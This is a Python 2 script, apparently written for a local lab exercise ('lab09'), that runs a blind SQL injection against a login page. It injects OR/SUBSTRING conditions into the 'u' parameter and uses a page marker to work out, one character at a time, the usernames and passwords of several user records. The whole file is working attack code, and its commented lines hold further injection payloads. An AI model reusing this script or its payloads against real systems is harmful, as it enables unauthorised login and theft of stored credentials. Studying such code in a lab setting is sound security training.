import subprocess
import urllib
import string
from itertools import cycle


# request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20" 
# request = "http://localhost/lab09/login.php?u=\"%20OR%201%20--%20 " 
#bashCommand = "echo 'hello' "
# subprocess.call(['wget','-q','-O','index.html',request])
#output, error = process.communicate()
#print output
#print error
#print bashCommand


listASCII=string.printable
iterator=cycle(['username','password'])
for row in xrange(97,100):
	field=iterator.next()
	print field
	size = 0;
	for s in xrange(0,40):
		request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20" + str(row) + "%20AND%20length(" + str(field) + ")%20=%20" + str(s) + "--%20"
		f = urllib.urlopen(request)
		response = f.read()
		if (response.find('cat.JPG')!=-1): 
			print "found size : %s" %s
			size = s
			break

	for pos in xrange(1,size+1):

		for c in xrange(0,128):
			request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20"+ str(row) +"%20AND%20SUBSTRING(" + str(field) + ","+ str(pos) +",1)%20=%20%27" + listASCII[c] + "%27%20--%20" 
			f = urllib.urlopen(request)
			response = f.read()
			if (response.find('cat.JPG')!=-1): 
				print "found letter %s at position %d" %(listASCII[c],pos)
				break


		



# f = urllib.urlopen(request)
# print "1" + f.geturl()
# print "2" + f.read()